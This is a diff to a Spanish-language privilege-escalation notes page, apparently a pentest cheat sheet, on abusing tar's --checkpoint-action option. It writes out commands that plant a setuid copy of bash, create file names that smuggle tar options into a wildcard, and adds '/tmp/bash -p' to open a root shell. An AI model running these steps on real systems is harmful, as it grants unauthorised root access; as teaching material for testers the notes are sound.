@@ -1267,13 +1267,15 @@ Por ejemplo: Tar tiene un argumento "checkpoint" asi pues:
 
 Este argumento lo que hace es permitir al usuario definir una accion que ejecutar durante el checkpoint
 
-* echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt; runme.sh
+* echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' &gt; runme.sh
 * touch /writable/path/used/by/tar --checkpoint=1
 * touch /writable/path/used/by/tar --checkpoint-action=exec sh\ runme.sh
 
 
 * echo "" > "--checkpoint-action=exec=sh privesc.sh"
 * echo "" > --checkpoint=1
+
+* /tmp/bash -p
 
 ## Técnicas
 
